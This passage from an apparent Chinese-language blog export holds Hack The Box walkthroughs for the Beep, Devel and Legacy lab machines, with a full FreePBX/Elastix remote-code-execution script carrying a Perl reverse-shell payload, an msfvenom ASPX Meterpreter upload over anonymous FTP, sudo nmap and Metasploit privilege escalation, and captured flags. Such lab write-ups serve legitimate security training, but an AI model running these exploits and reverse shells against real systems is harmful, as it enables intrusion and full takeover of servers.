2.6.0 - Persistent Cross-Site Scripting                                                                                                                           | multiple/webapps/11184.txt\nFreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution                                                                                                                 | php/webapps/15098.txt\nFreePBX 2.9.0/2.10.0 - 'callmenum' Remote Code Execution (Metasploit)                                                                                                             | php/webapps/18659.rb\nFreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities                                                                                                                                   | php/webapps/18649.txt\nFreePBX < 13.0.188 - Remote Command Execution (Metasploit)                                                                                                                        | php/remote/40434.rb\nFreepbx < 2.11.1.5 - Remote Code Execution                                                                                                                                        | php/webapps/41005.txt\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªRCEçš„æ¼æ´ php/webapps/18650.py å’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep]\nâ””â”€# cat exploit.py \n#!/usr/bin/python\n############################################################\n# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit\n# Google Dork: oy vey\n# Date: March 23rd, 2012\n# Author: muts\n# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.\n# Tested on: multiple\n# CVE : notyet\n# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ \n# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt\n############################################################\n# Discovered by Martin Tschirsich\n# http://seclists.org/fulldisclosure/2012/Mar/234\n# http://www.exploit-db.com/exploits/18649\n############################################################\nimport urllib\nrhost=\"172.16.254.72\"\nlhost=\"172.16.254.223\"\nlport=443\nextension=\"1000\"\n\n# Reverse shell payload\n\nurl = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'\n\nurllib.urlopen(url)\n\n# On Elastix, once we have a shell, we can escalate to root:\n# root@bt:~# nc -lvp 443\n# listening on [any] 443 ...\n# connect to [172.16.254.223] from voip [172.16.254.72] 43415\n# id\n# uid=100(asterisk) gid=101(asterisk)\n# sudo nmap --interactive\n\n# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )\n# Welcome to Interactive Mode -- press h <enter> for help\n# nmap> !sh\n# id\n# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\nç¨å¾®åšä¸€ä¸‹ä¿®æ”¹\n\n```bash\nrhost=\"10.10.10.7\"\nlhost=\"10.10.16.2\"\nlport=4444\nextension=\"1000\"\n```\nä¿®æ”¹å¥½ä»¥åå»æ‰§è¡Œè¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep]\nâ””â”€# python exploit.py \nTraceback (most recent call last):\n  File \"exploit.py\", line 27, in <module>\n    urllib.urlopen(url)\n  File \"/usr/lib/python2.7/urllib.py\", line 87, in urlopen\n    return opener.open(url)\n  File \"/usr/lib/python2.7/urllib.py\", line 215, in open\n    return getattr(self, name)(url)\n  File \"/usr/lib/python2.7/urllib.py\", line 445, in open_https\n    h.endheaders(data)\n  File \"/usr/lib/python2.7/httplib.py\", line 1078, in endheaders\n    self._send_output(message_body)\n  File \"/usr/lib/python2.7/httplib.py\", line 894, in _send_output\n    self.send(msg)\n  File \"/usr/lib/python2.7/httplib.py\", line 856, in send\n    self.connect()\n  File \"/usr/lib/python2.7/httplib.py\", line 1303, in connect\n    server_hostname=server_hostname)\n  File \"/usr/lib/python2.7/ssl.py\", line 369, in wrap_socket\n    _context=self)\n  File \"/usr/lib/python2.7/ssl.py\", line 599, in __init__\n    self.do_handshake()\n  File \"/usr/lib/python2.7/ssl.py\", line 828, in do_handshake\n    self._sslobj.do_handshake()\nIOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)\n```\nè¿™è¾¹urllibæŠ¥é”™äº†ï¼Œæƒ³ä¸ªåŠæ³•ï¼Œç»™åˆ æ‰æ”¹æˆprintè¾“å‡ºæ‰‹åŠ¨æ‰§è¡Œè¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep]\nâ””â”€# python exploit.py \nhttps://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\n```\nå»æµè§ˆå™¨é‡Œè®¿é—®ä¸€ä¸‹\n\nå»è®¿é—®åè¿™ä¸€æ®µæ²¡æœ‰å¼¹å›shellï¼Œå»æ‰¾ä¸€ä¸‹åŸå› \n\næ’æŸ¥åå‘ç°åº”è¯¥æ˜¯extensionçš„é—®é¢˜ï¼Œå»æŸ¥æ‰¾ä¸€ä¸‹æ­£ç¡®çš„extension\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# svwar -m INVITE -e200-300 10.10.10.7\nWARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nWARNING:TakeASip:extension '239' probably exists but the response is unexpected\nWARNING:TakeASip:extension '241' probably exists but the response is unexpected\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\n+-----------+----------------+\n| Extension | Authentication |\n+===========+================+\n| 233       | reqauth        |\n+-----------+----------------+\n| 239       | weird          |\n+-----------+----------------+\n| 241       | weird          |\n+-----------+----------------+\n```\næ­£ç¡®çš„æ˜¯233ï¼Œå’±ä»¬å»exploité‡Œä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åé‡æ–°ç”Ÿæˆ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep]\nâ””â”€# python exploit.py\nhttps://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\n```\nå†å»è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 46340\npython -c \"import pty;pty.spawn('/bin/bash')\"\nbash-3.2$ whoami&&id\nwhoami&&id\nasterisk\nuid=100(asterisk) gid=101(asterisk)\n```\næˆåŠŸæ‹¿åˆ°useræƒé™\n\n```bash\nbash-3.2$ cd /home\ncd /home\nbash-3.2$ ls\nls\nfanis  spamfilter\nbash-3.2$ cd fanis\ncd fanis\nbash-3.2$ ls\nls\nuser.txt\nbash-3.2$ cat user.txt\ncat user.txt\ne6da504f44f4d004da91498eec298b24\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n## æƒé™æå‡\n```bash\n# On Elastix, once we have a shell, we can escalate to root:\n# root@bt:~# nc -lvp 443\n# listening on [any] 443 ...\n# connect to [172.16.254.223] from voip [172.16.254.72] 43415\n# id\n# uid=100(asterisk) gid=101(asterisk)\n# sudo nmap --interactive\n\n# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )\n# Welcome to Interactive Mode -- press h <enter> for help\n# nmap> !sh\n# id\n# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\næŒ‰ç…§exploité‡Œæç¤ºçš„è¿›è¡Œææƒè¯•è¯•\n\n```bash\nbash-3.2$ sudo nmap --interactive\nsudo nmap --interactive\n\nStarting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )\nWelcome to Interactive Mode -- press h <enter> for help\nnmap> !sh\n!sh\nsh-3.2# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™\n\n```bash\nsh-3.2# cd /root\ncd /root\nsh-3.2# ls\nls\nanaconda-ks.cfg            install.log.syslog  webmin-1.570-1.noarch.rpm\nelastix-pr-2.2-1.i386.rpm  postnochroot\ninstall.log                root.txt\nsh-3.2# cat root.txt\ncat root.txt\n493be6af70ce6780ee96432618649fe4\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶\n\nå’±ä»¬çœ‹ä¸€ä¸‹åŸç†\n\n```bash\nsh-3.2# sudo -l\nsudo -l\nMatching Defaults entries for root on this host:\n    env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR\n    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE\n    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC\n    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET\n    XAUTHORITY\"\n\nUser root may run the following commands on this host:\n    (ALL) ALL\n```\nè¿™é‡Œå¯ä»¥æ‰§è¡Œçš„æƒé™è¿˜æŒºå¤šçš„","tags":["Hackthebox"]},{"title":"Devel - Hackthebox","url":"/2022/03/03/Hackthebox/Easy/Hackthebox-Devel/","content":"\n# Hackthebox - Devel\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Devel/e3ca3013-fa7c-4025-9bbd-3a42f1a2b731.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Devel/3ad2d2c5-f8af-42b7-9752-a8051edff749.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Devel]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.5                                                                                                                                                        130 â¨¯\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-03 02:16 EST\nNmap scan report for 10.10.10.5\nHost is up (0.70s latency).\nNot shown: 65533 filtered ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 03-18-17  01:06AM       <DIR>          aspnet_client\n| 03-17-17  04:37PM                  689 iisstart.htm\n|_03-17-17  04:37PM               184946 welcome.png\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: IIS7\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2\nAggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   934.01 ms 10.10.16.1\n2   934.05 ms 10.10.10.5\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.29 seconds\n```\n## Http\nå…ˆå»çœ‹çœ‹80ç«¯å£çš„webæœåŠ¡\n\n![](Hackthebox-Devel/44891644-3ea8-40c1-8d4c-86d46f00ffd9.png)\n\nå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„IISé¡µé¢ï¼Œæ²¡ä»€ä¹ˆå¯çœ‹çš„\n\n### FTP\nFTPå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥åŒ¿åç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Devel]\nâ””â”€# ftp 10.10.10.5\nConnected to 10.10.10.5.\n220 Microsoft FTP Service\nName (10.10.10.5:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp> dir\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n03-18-17  01:06AM       <DIR>          aspnet_client\n03-17-17  04:37PM                  689 iisstart.htm\n03-17-17  04:37PM               184946 welcome.png\n226 Transfer complete.\n```\nè¿™é‡Œçœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¼¼ä¹å’Œ80ç«¯å£çš„æ˜¯ä¸€æ ·çš„\n\nå»æœ¬åœ°åˆ›å»ºä¸ªæ–‡ä»¶ä¼ ä¸Šå»è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# echo \"I'm Lucifiel\" > test.html\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ftp 10.10.10.5\nConnected to 10.10.10.5.\n220 Microsoft FTP Service\nName (10.10.10.5:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp> put test.html \nlocal: test.html remote: test.html\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n226 Transfer complete.\n14 bytes sent in 0.00 secs (303.8194 kB/s)\nftp> ls\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n03-18-17  01:06AM       <DIR>          aspnet_client\n03-17-17  04:37PM                  689 iisstart.htm\n03-03-22  09:29AM                   14 test.html\n03-17-17  04:37PM               184946 welcome.png\n226 Transfer complete.\n```\næˆåŠŸä¼ ä¸Šå»äº†ï¼Œå’±ä»¬å»è®¿é—®çœ‹çœ‹æœ‰æ²¡æœ‰\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.5/test.html                                                                                   \nI'm Lucifiel\n```\nOKï¼Œä¼ ä¸Šå»äº†ï¼Œè¯æ˜çŒœæƒ³æ²¡é”™ï¼Œé‚£å°±ç®€å•äº†ï¼Œå»ç”Ÿæˆä¸ªé©¬ä¼ ä¸Šå»å§\n\n## æ¼æ´åˆ©ç”¨\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f aspx -o shell.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of aspx file: 2901 bytes\nSaved as: shell.aspx\n```\nä½¿ç”¨msfç”Ÿæˆä¸€ä¸ªaspxçš„æœ¨é©¬\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ftp 10.10.10.5\nConnected to 10.10.10.5.\n220 Microsoft FTP Service\nName (10.10.10.5:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp> put shell.aspx\nlocal: shell.aspx remote: shell.aspx\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n226 Transfer complete.\n2938 bytes sent in 0.00 secs (58.3728 MB/s)\n```\nç„¶åä½¿ç”¨ftpä¼ ä¸Šå»\n\n```bash\nmsf6 > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf6 > use exploit/multi/handler\n[*] Using configured payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 10.10.16.2\nlhost => 10.10.16.2\nmsf6 exploit(multi/handler) > set lport 4444\nlport => 4444\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444\n```\nç„¶åä½¿ç”¨msfå¼€å¯ç«¯å£ç›‘å¬\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Devel]\nâ””â”€# curl http://10.10.10.5/shell.aspx\n```\nç„¶åè®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„aspxé©¬\n\n```bash\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] Sending stage (175174 bytes) to 10.10.10.5\n[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.5:49162) at 2022-03-03 02:37:15 -0500\n\nmeterpreter > getuid\nServer username: IIS APPPOOL\\Web\nmeterpreter > sysinfo\nComputer        : DEVEL\nOS              : Windows 7 (6.1 Build 7600).\nArchitecture    : x86\nSystem Language : el_GR\nDomain          : HTB\nLogged On Users : 2\nMeterpreter     : x86/windows\n```\næˆåŠŸæ‹¿åˆ°shell\n\n## æƒé™æå‡\n```bash\nmeterpreter > background \n[*] Backgrounding session 1...\nmsf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester\n[*] Using configured payload windows/meterpreter/reverse_tcp\nmsf6 post(multi/recon/local_exploit_suggester) > set session 1\nsession => 1\nmsf6 post(multi/recon/local_exploit_suggester) > exploit \n\n[*] 10.10.10.5 - Collecting local exploits for x86/windows...\n[*] 10.10.10.5 - 38 exploit checks are being tried...\n[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.\n[*] Post module execution completed\n```\nä½¿ç”¨post/multi/recon/local\\_exploit\\_suggesterä½œä¸ºææƒè¾…åŠ©è„šæœ¬\n\nè¿™é‡Œæµ‹è¯•å‡ºæ¥å¯ä»¥ä½¿ç”¨çš„ææƒexpæŒºå¤šçš„ï¼Œæˆ‘ä»¬å°±æ‹¿ç¬¬ä¸€ä¸ªå§\n\n```bash\nuse exploit/windows/local/ms10_015_kitrap0d\nset session 1\nset lhost 10.10.16.2\n```\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > show options \n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n```\nè®¾ç½®å¥½ä»¥åï¼Œæ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] Launching notepad to host the exploit...\n[+] Process 3972 launched.\n[*] Reflectively injecting the exploit DLL into 3972...\n[*] Injecting exploit into 3972 ...\n[*] Exploit injected. Injecting payload into 3972...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (175174 bytes) to 10.10.10.5\n[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.10.10.5:49163) at 2022-03-03 02:44:09 -0500\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer        : DEVEL\nOS              : Windows 7 (6.1 Build 7600).\nArchitecture    : x86\nSystem Language : el_GR\nDomain          : HTB\nLogged On Users : 2\nMeterpreter     : x86/windows\n```\næˆåŠŸæ‹¿åˆ°systemæƒé™\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Users\\babis\\Desktop\\user.txt (34 bytes)\nmeterpreter > cat 'c:\\Users\\babis\\Desktop\\user.txt'\n489b24475e33a86c802d19db5fbd40e1\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes)\nmeterpreter > cat 'c:\\Users\\Administrator\\Desktop\\root.txt'\naf3b66607827cd5c2153fdbfff2a558a\n```\næˆåŠŸæ‹¿åˆ°userå’Œrootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Legacy - Hackthebox","url":"/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/","content":"\n# Hackthebox - Legacy\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Legacy/f5eb7547-9e3a-4cc8-842f-a2ab974ba777.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Legacy/84aed2b0-7cde-457b-a81b-01aefa5b1490.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\n```bash\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:06 EST\nNmap scan report for 10.10.10.4\nHost is up (0.54s latency).\nNot shown: 65532 filtered ports\nPORT     STATE  SERVICE       VERSION\n139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open   microsoft-ds  Windows XP microsoft-ds\n3389/tcp closed ms-wbt-server\nDevice type: general purpose|specialized\nRunning (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%)\nOS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2\nAggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m49s, median: 4d23h57m40s\n|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e2:3e (VMware)\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2022-03-07T09:04:30+02:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   541.52 ms 10.10.16.1\n2   541.58 ms 10.10.10.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 101.31 seconds\n```\n### Samba\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Legacy]\nâ””â”€# nmap -p445 --min-rate 5000 --script=vuln 10.10.10.4                                                                                                                                                       130 â¨¯\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:10 EST\nNmap scan report for 10.10.10.4\nHost is up (0.24s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF\n| smb-vuln-ms08-067: \n|   VULNERABLE:\n|   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2008-4250\n|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n|           code via a crafted RPC request that triggers the overflow during path canonicalization.\n|           \n|     Disclosure date: 2008-10-23\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n\nNmap done: 1 IP address (1 host up) scanned in 28.55 seconds\n```\nä½¿ç”¨vulnæ’ä»¶æ‰«æ445ç«¯å£çš„smbåå‘ç°å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼ŒMS08-067å’ŒMS17-010ï¼Œåˆ†åˆ«å»åˆ©ç”¨ä¸€ä¸‹è¯•è¯•\n\n## æ¼æ´åˆ©ç”¨\n### MS08-067\n```bash\nmsf6 exploit(windows/smb/ms08_067_netapi) > show options \n\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT    445              yes       The SMB service port (TCP)\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)\n   